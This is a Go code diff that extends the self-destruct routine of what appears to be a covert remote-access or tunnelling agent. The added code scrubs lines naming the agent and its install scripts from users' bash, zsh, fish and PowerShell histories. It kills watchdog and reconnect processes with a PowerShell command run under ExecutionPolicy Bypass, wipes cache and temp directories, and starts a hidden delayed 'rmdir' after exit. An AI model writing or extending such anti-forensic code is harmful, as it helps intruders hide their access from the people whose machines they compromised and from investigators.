@@ -387,13 +387,21 @@ func min64(a, b int64) int64 {
 }
 
 func scrubShellArtifacts() {
-	markers := []string{"HelperHost", "EdgeRelay", "agentshe", "bootstrap-sh", "bootstrap&enroll", "HelperHostCache"}
+	markers := []string{
+		"HelperHost", "EdgeRelay", "agentshe", "AgentSHE", "lilygopro",
+		"bootstrap-sh", "bootstrap&enroll", "HelperHostCache",
+		"install.sh", "install.ps1",
+	}
 	home, _ := os.UserHomeDir()
 	var candidates []string
 	if runtime.GOOS == "windows" {
 		candidates = append(candidates, filepath.Join(home, "AppData", "Roaming", "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt"))
 	} else {
-		candidates = append(candidates, filepath.Join(home, ".bash_history"), filepath.Join(home, ".zsh_history"))
+		candidates = append(candidates,
+			filepath.Join(home, ".bash_history"),
+			filepath.Join(home, ".zsh_history"),
+			filepath.Join(home, ".local", "share", "fish", "fish_history"),
+		)
 	}
 	for _, path := range candidates {
 		b, err := os.ReadFile(path)
@@ -421,19 +429,62 @@ func scrubShellArtifacts() {
 	}
 }
 
+func killRelatedProcs() {
+	// Stop watchdog / reconnect so they cannot restore HelperHost from cache mid-wipe.
+	if runtime.GOOS == "windows" {
+		ps := `
+$ErrorActionPreference='SilentlyContinue'
+Get-CimInstance Win32_Process | Where-Object {
+  $_.CommandLine -and (
+    $_.CommandLine -match 'HelperHost|EdgeRelay|watchdog\.vbs|reconnect\.vbs|AgentShe'
+  ) -and $_.Name -match '^(wscript|cscript|EdgeRelay)\.exe$'
+} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
+taskkill /F /IM EdgeRelay.exe 2>$null
+`
+		_ = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps).Run()
+		return
+	}
+	for _, pat := range []string{
+		filepath.Join(dir, "watchdog.sh"),
+		filepath.Join(dir, "reconnect.sh"),
+		"HelperHostCache",
+		edgeName,
+	} {
+		_ = exec.Command("pkill", "-f", pat).Run()
+	}
+}
+
 func wipeAll() {
 	stopFlag = true
 	removeAutostart()
+	killRelatedProcs()
 	killTunnelOnly()
 	scrubShellArtifacts()
-	secureRmTree(dir)
+	// Cache first — prevents watchdog restore race if anything still runs.
 	secureRmTree(cacheDir)
+	secureRmTree(dir)
 	home, _ := os.UserHomeDir()
 	secureRmTree(filepath.Join(home, ".agentshe"))
 	if runtime.GOOS == "windows" {
 		if local := os.Getenv("LOCALAPPDATA"); local != "" {
 			secureRmTree(filepath.Join(local, "AgentShe"))
 			secureRmTree(filepath.Join(local, "CabaretAgent"))
+		}
+		if tmp := os.Getenv("TEMP"); tmp != "" {
+			secureRmTree(filepath.Join(tmp, "HelperHostCache"))
+		}
+		// Running .exe may stay locked until exit — finish wipe after process dies.
+		delayed := fmt.Sprintf(
+			`ping 127.0.0.1 -n 4 >nul & rmdir /s /q "%s" & rmdir /s /q "%s"`,
+			dir, cacheDir,
+		)
+		cmd := exec.Command("cmd", "/C", delayed)
+		hideWindow(cmd)
+		_ = cmd.Start()
+	} else {
+		secureRmTree("/tmp/HelperHostCache")
+		if t := os.Getenv("TMPDIR"); t != "" {
+			secureRmTree(filepath.Join(t, "HelperHostCache"))
 		}
 	}
 	os.Exit(0)
